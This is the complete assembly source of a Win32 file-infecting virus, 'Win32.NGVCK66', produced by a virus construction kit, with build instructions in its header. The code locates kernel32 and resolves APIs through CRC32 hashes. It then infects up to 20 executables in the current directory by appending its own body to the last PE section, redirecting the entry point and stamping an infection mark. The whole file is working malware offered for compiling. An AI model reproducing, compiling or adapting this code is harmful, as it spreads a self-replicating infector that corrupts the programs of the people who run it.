              
;
;
; Win32.NGVCK66 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK66
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop eax
                                        ; mov ebp, eax
                                        ; clear ebp
 mov ebp, 28974d
 sub ebp, 28974d
 add ebp, eax
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d - 12d )
 add eax, 12d
 and eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 add esp, -4d
                                        ; round to pages
 sub cx, cx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 73213
 sub dword ptr [ebp+K32Trys], 3213d

GK1:                                    ; check for DOS-EXE Stub
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+K32Trys]
 or edx, edx
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 xor edx, 'ZM'
 jz CheckPE

GK2:
 inc ecx
 sub ecx, 65537d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edi, [ecx+3Ch]
 shr edx, 7d                            ; Trash
 neg ecx
 sub edi, ecx
 neg ecx
                                        ; check for EP
 movzx edx, word ptr [edi]
 xor edx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edi, 22
 inc edi
 add edi, 21d
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [edi]
 and bx, 0F000h
 cmp bx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 sub edi, 22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], -1
 and dword ptr [ebp+KernelPE], edi

 jmp GetApis

;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear ecx
 mov ecx, -47026d
 add ecx, 47026d
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; check for ZM
 movzx eax, word ptr [esi]
 xor eax, 'ZM'
 jz Goodfile
                                        ; mov ecx, 43813
 mov ecx, 43813d
 cmp ecx, 43813d
 je Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 je Notagoodfile
 mov edx, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [edx]
 sub ecx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
 or ecx, 5779567d                       ; Trash
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
 mov ecx, [eax+3Ch]
 mov eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 mov eax, 63637d
 sub eax, 63637d
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; clear esi
 xor esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
 mov esi, eax
                                        ; get last section
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [esi+06h]
 dec edx
 imul edx, edx, 28h
                                        ; add eax, 120
 dec eax
 add eax, 121d
 add eax, edx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [esi+74h]
 clc
 rcl ebx, 3
 add eax, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ecx, dword ptr [esi+28h]
 push ecx
 pop dword ptr [ebp+OldEIP]
 mov ecx, [eax+10h]
                                        ; mov edx, ecx
 push ecx
 pop edx
 add eax, 14h
 add ecx, [eax]
 sub eax, 14h
 push ecx
 mov ebx, edx
 add eax, 0Ch
 add ebx, [eax]
 sub eax, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 dec dword ptr [ebp+Trash1]             ; Trash
 add dword ptr [esi+28h], ebx
                                        ; clear ebx
 xor ebx, ebx

 add ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [eax+08h], ebx
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 lea edx, [ebp+Virus]
 xchg edx, esi
 xor dword ptr [ebp+Trash1], edx        ; Trash

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d - 0d )
 add ebx, 0d
 and ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg eax, esi

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, ( 20d xor 21d )
 xor ecx, 21d
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edi

 push edi
 pop dword ptr [ebp+retBase]

 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx

 and dword ptr [ebp+Trash1], 403735     ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov edx, ebp
 add edx, offset WFD_szFileName

                                        ; mov ecx, 276
 push 276d
 pop ecx

ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 inc edx
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea eax, [ebp+WFD_szFileName]
 xchg edi, eax

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 push 4d
 pop ecx
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
                                        ; clear ebx
 push 0
 pop ebx
 push edx
 push ebx
 push ebx
 push 2h
 rol ecx, 23d                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret
 and ebx, 75052644d                     ; Trash

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov edx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], edx
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
                                        ; mov edx, ecx
 push ecx
 pop edx
                                        ; mov esi, edx
 mov esi, edx
 push esi
 push eax
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 sub ecx, dword ptr [eax]
 test ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop esi
                                        ; clear edx
 mov edx, -41482d
 add edx, 41482d
 add edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 add edx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
 shl ebx, 6d                            ; Trash
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop ebx
                                        ; clear edx
 mov edx, 16217d
 sub edx, 16217d
 mov dx, word ptr [ebx]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, esi
 mov edi, esi
                                        ; mov eax, esi
 mov eax, esi
LenCRC:
                                        ; add eax, 1
 sub eax, -1d
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, edi
                                        ; mov esi, eax
                                        ; clear esi
 mov esi, -4142d
 add esi, 4142d
 add esi, eax
                                        ; add esi, 1
 add esi, 1d
 cld
                                        ; clear ecx
 sub ecx, ecx
 sub ecx, 1
                                        ; mov edx, ecx
 push ecx
 pop edx
NextByteCRC:
                                        ; clear eax
 sub eax, eax
                                        ; clear ebx
 mov ebx, 0
 mov al, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor al, cl
 mov cl, ch
 mov ch, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr bx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor bx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor ecx, eax
 xor edx, ebx
 dec esi
jnz NextByteCRC
 not edx
 not ecx
 mov eax, edx
 rol eax, 16d
 mov ax, cx
 push eax
 pop dword ptr [ebp+APICRC32]
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx
 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov eax, [edx+78h]
 add eax, [ebp+KernelMZ]
 or ecx, 84974934d                      ; Trash
                                        ; add eax, 28
 dec eax
 add eax, 29d
                                        ; get ATableVA
 mov edx, dword ptr [eax]
                                        ; add eax, 4
 add eax, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; add eax, 4
 inc eax
 xor ecx, 73687180d                     ; Trash
 add eax, 3d
 mov dword ptr [ebp+NTableVA], edx
                                        ; get OTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; load API Names and Offsets
 mov eax, ebp
 add eax, offset APINames

 lea edi, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
 mov ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], ecx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;                  [ ///// * Data * \\\\\ ]

Data:
 KernelMZ    dd 0h
 counter     dw 0h
 K32Trys     dd 0h
 NewEIP      dd 0h
 OldBase     dd 400000h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 08C892DDFh           ; CreateFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 094524B42h           ; UnmapViewOfFile
 dd 068624A9Dh           ; CloseHandle
 dd 0AA700106h           ; FindNextFileA
 dd 0C200BE21h           ; FindClose

 MapAddress  dd 0h
 FindHandle  dd 0h
 ATableVA    dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h

 AlignReg1   dd 0h
 TempAPI     dd 0h
 AlignReg2   dd 0h
 OTableVA    dd 0h
 MapHandle   dd 0h
 db 'Virus : Win32.NGVCK66 Author : SnakeByte',0
 NewSize     dd 0h
 filemask    db '*.Exe',0
 Trash1      dd 0h
 NTableVA    dd 0h
 InfCounter  dd 0h
 OldEIP      dd 0h
 NTableTemp  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 APICRC32    dd 0h
 FileHandle  dd 0h
 KernelPE    dd 0h




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 inc ecx                                ; Trash
                                        ; clear ecx
 mov ecx, 36104d
 sub ecx, 36104d
 push ecx
 call ExitProcess



end FakeCode

